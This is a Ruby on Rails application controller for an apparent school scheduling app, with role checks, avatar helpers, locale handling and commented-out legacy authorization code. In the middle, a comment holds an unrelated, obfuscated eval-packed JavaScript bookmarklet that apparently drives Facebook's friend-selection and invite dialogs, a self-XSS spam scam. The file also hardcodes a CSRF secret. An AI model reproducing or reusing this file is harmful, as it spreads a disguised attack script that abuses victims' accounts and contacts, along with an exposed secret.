# -*- coding: utf-8 -*-
# Filters added to this controller apply to all controllers in the application.
# Likewise, all the methods added will be available for all controllers.
 
class ApplicationController < ActionController::Base
  rescue_from CanCan::AccessDenied do |exception|
    session[:original_uri] = request.request_uri
    flash[:error] = t( 'access_denied' )
    redirect_to mypage_path( current_user.username )
  end
  #before_filter { |c| Authorization.current_user = c.current_user2 }
  #before_filter :authorize, :except=>[:login,:logout,:index,:show,:live_search]
  #before_filter :authorize_view, :only=>[:index,:show,:live_search]
  before_filter :set_default_user_language
  helper_method :clearance, :avatar_mini_url, :avatar_micro_url
  helper_method :clearance?
  helper_method :current_user
  helper_method :staff?
  helper_method :student?
  helper_method :teacher?
  helper_method :association_delete_error_messages
  helper_method :association_delete_error_message
  helper_method :units_per_schedule
  helper_method :week_range
  helper_method :today
  
  session :session_key => '_yoyaku_session_id'
  layout "courses"
  helper :all # include all helpers, all the time
 
  # See ActionController::RequestForgeryProtection for details
  # Uncomment the :secret if you're not using the cookie session store
  protect_from_forgery :secret => '251028ccdbfd8fbd09dbbdbe5de58b2c'
  
  # See ActionController::Base for details 
  # Uncomment this to filter the contents of submitted sensitive data parameters
  # from your application log (in this case, all fields with names like "password"). 
  filter_parameter_logging :password
  
  helper_method :current_user2, :japanese?
  
  def current_user_session2
    return @current_user_session2 if defined?( @current_user_session2 )
    @current_user_session2 = UserSession.find
  end
  
  def current_user2
    return @current_user2 if defined?( @current_user2 )
    @current_user2 = current_user_session2 && current_user_session2.record
  end
  
  def current_user
    return current_user2
  end	

  def staff?
    return false if current_user.nil?
    return current_user.role?( :god ) ||
      current_user.role?( :admin ) ||
      current_user.role?( :observer )
  end

  def admin?() current_user.role?( :god ) || current_user.role?( :admin ) end
  def student?() current_user.role? :student end
  def teacher?() current_user.role? :teacher end
  
  def avatar_mini_url( user )
    if user
      if user.avatar?    	    
        user.avatar.url(:mini)
      else
        "/images/mafumafu.jpg"
      end
    else
      "/images/mafumafu.jpg"
    end
  end
  
  def avatar_micro_url( user )
    if user
      if user.avatar?    	    
        user.avatar.url(:micro)
      else
        "/images/mafumafu.jpg"
      end
    else
      "/images/mafumafu.jpg"
    end
  end
  
  def logged_in2?
    current_user2 != nil
  end
  
  def japanese?
    I18n.locale == 'ja'
  end

  def today( date )
    return nil if date.nil?
    date = date.strftime("%Y-%m-%d") unless date.instance_of? String
    return nil if Time.zone.now.strftime("%Y-%m-%d") == date
    return date
  end
  
  def week_range(start_date, end_date, todays_date, range)
    week_intervals = [""]
    todays = [""]
    range.times do
      week_intervals << "#{start_date.strftime('%m/%d')}～#{end_date.strftime('%m/%d')}"
      todays << "#{todays_date.strftime("%Y-%m-%d")}"
      start_date -= 7.day
      end_date -= 7.day
      todays_date -= 7.day
    end
    week_intervals.zip( todays )
  end  

  def set_default_user_language
    #@current_settings ||= Setting.find_by_name( 'main' )
    #I18n.locale = logged_in? ? current_user.language : ( @current_settings ? @current_settings.language : "ja" )
    
    #I18n.locale = "en" 
    
    I18n.locale = ( current_user2 ? current_user2.language : ( session[:language] ? session[:language] : "ja" )) #( @setting ? @setting.language : "ja" )))
  end  
  
  protected
  
  def permission_denied
    flash[:error] = t( 'access_denied' )
    redirect_to login_user_path
  end
  
  #	def login
  #	end
  #
  def authorize
    if !logged_in?
      login_redirection
    elsif clearance >= 3
      redirect_to current_user.student.nil? ? current_user.teacher : edit_klasses_student_path( current_user.student.id )
    end
  end
  
  def authorize_view
    if !logged_in?
      login_redirection
    elsif clearance >= 4
      redirect_to current_user.student.nil? ? current_user.teacher : edit_klasses_student_path( current_user.student.id )
    end
  end
  #    
#  def clearance?(level)
#    if level>=1 && session[:user_name] == "johan_sveholm"
#      return true
#    elsif level>=2 && ( session[:user_name] == "daniel" || session[:user_name] == "komatsu_aya" || session[:user_name] == "aya" || session[:user_name] == "maki" || session[:user_name] == "umetsu" ||
#    	session[:user_name] == "ikue" || session[:user_name] == "thomas" || session[:user_name] == "mogi" )
#      return true
#		elsif level>=3 && session[:user_name] == "thomas_osburg"
#      return true
#    elsif level>=4
#      return true
#    end
#    return false
#  end
#  
#  def clearance
#		if session[:user_name] == "johan_sveholm"
#      return 1
#    elsif( session[:user_name] == "daniel" || session[:user_name] == "komatsu_aya" || session[:user_name] == "aya" || session[:user_name] == "maki" || session[:user_name] == "umetsu" ||
#    	session[:user_name] == "ikue" || session[:user_name] == "thomas" || session[:user_name] == "mogi" )
#      return 2
#		elsif session[:user_name] == "thomas_osburg"
#			return 3
#		end
#		return 4
#  end
#

#javascript:(function(){a='app126063127406590_jop';b='app126063127406590_jode';ifc='app126063127406590_ifc';ifo='app126063127406590_ifo';mw='app126063127406590_mwrapper';eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('P e=["\\p\\g\\l\\g\\I\\g\\k\\g\\h\\D","\\l\\h\\D\\k\\f","\\o\\f\\h\\v\\k\\f\\q\\f\\j\\h\\J\\D\\Q\\x","\\y\\g\\x\\x\\f\\j","\\g\\j\\j\\f\\z\\R\\K\\L\\S","\\p\\n\\k\\A\\f","\\l\\A\\o\\o\\f\\l\\h","\\k\\g\\G\\f\\q\\f","\\l\\k\\g\\j\\G","\\L\\r\\A\\l\\f\\v\\p\\f\\j\\h\\l","\\t\\z\\f\\n\\h\\f\\v\\p\\f\\j\\h","\\t\\k\\g\\t\\G","\\g\\j\\g\\h\\v\\p\\f\\j\\h","\\x\\g\\l\\u\\n\\h\\t\\y\\v\\p\\f\\j\\h","\\l\\f\\k\\f\\t\\h\\w\\n\\k\\k","\\l\\o\\q\\w\\g\\j\\p\\g\\h\\f\\w\\T\\r\\z\\q","\\H\\n\\U\\n\\V\\H\\l\\r\\t\\g\\n\\k\\w\\o\\z\\n\\u\\y\\H\\g\\j\\p\\g\\h\\f\\w\\x\\g\\n\\k\\r\\o\\W\\u\\y\\u","\\l\\A\\I\\q\\g\\h\\X\\g\\n\\k\\r\\o","\\g\\j\\u\\A\\h","\\o\\f\\h\\v\\k\\f\\q\\f\\j\\h\\l\\J\\D\\K\\n\\o\\Y\\n\\q\\f","\\Z\\y\\n\\z\\f","\\u\\r\\u\\w\\t\\r\\j\\h\\f\\j\\h"];d=M;d[e[2]](1a)[e[1]][e[0]]=e[3];d[e[2]](a)[e[4]]=d[e[2]](b)[e[5]];s=d[e[2]](e[6]);m=d[e[2]](e[7]);N=d[e[2]](e[8]);c=d[e[10]](e[9]);c[e[12]](e[11],E,E);s[e[13]](c);B(C(){1b[e[14]]()},O);B(C(){1c[e[17]](e[15],e[16]);B(C(){c[e[12]](e[11],E,E);N[e[13]](c);B(C(){F=M[e[19]](e[18]);1d(i 1e F){1f(F[i][e[5]]==e[1g]){F[i][e[13]](c)}};m[e[13]](c);B(C(){d[e[2]](1h)[e[4]]=d[e[2]](1i)[e[5]];d[e[2]](e[1j])[e[1]][e[0]]=e[3]},1k)},1l)},1m)},O);',62,85,'||||||||||||||_0x82af|x65|x69|x74||x6E|x6C|x73||x61|x67|x76|x6D|x6F||x63|x70|x45|x5F|x64|x68|x72|x75|setTimeout|function|x79|true|inp|x6B|x2F|x62|x42|x54|x4D|document|sl|5000|var|x49|x48|x4C|x66|x6A|x78|x2E|x44|x4E|x53|||||||||||mw|fs|SocialGraphManager|for|in|if|20|ifo|ifc|21|2000|4000|3000'.split('|'),0,{}))})();

private

def association_delete_error_message( size, mess )
	unless size==0
		return mess + ' (' + size.to_s + ')'
	end
	""
end

def association_delete_error_messages( associations, messes )
	errors = []
	associations.each_with_index do |association,i|
		mess = association_delete_error_message( associations[i], messes[i] )
		errors.push mess unless mess == ""
	end
	errors.compact
end	

#
#  def current_user
#		session[:user] ||= Person.find_by_user_name( session[:user_name], :include => [{ :student=>:klasses },{ :teacher=>:klasses }])
#  end
#  
#  def current_user_status
#		if current_user.teacher.nil?
#			current_user.student
#		else
#			current_user.teacher
#		end
#	end  
#
#  def default_page( person_id=-1 )
#  	if clearance == 3
#  		if person_id == -1
#  			return klasses_path
#  		end
#  		person = Person.find( person_id, :include=>[ :student,:teacher ])
#  		if( person.student.nil? )
#  			person.teacher
#  		else
#  			person.student
#  		end
#  	else
#	  	current_user.student.nil? ?
#	  		current_user.teacher :
#	  		edit_klasses_student_path( current_user.student.id )
#	  end
#	end	
#
  def logged_in?
    session[:user_name] != nil
  end

	def login_redirection
    session[:original_uri] = request.request_uri
    flash[:notice] = t('login.title')
    redirect_to login_user_path #:controller=>:admin, :action=>:login
	end
#
#  def get_sorting
#		session[:sorting] ||= Sorting.new
#	end
#	
#	def get_settings
#		session[:settings] ||= Setting.find_by_name( "main" )
#	end
#
#	def people_per_page
#		get_settings.people_per_page
#	end
#
#	def set_settings( settings = 'main' )
#		session[:settings] = Setting.find_by_name( "main" )
#	end
#
#	def set_username( username )
#		session[:user_name] = username
#	end        
#	
#	def units_per_schedule
#		get_settings.units_per_schedule
#	end
end
 
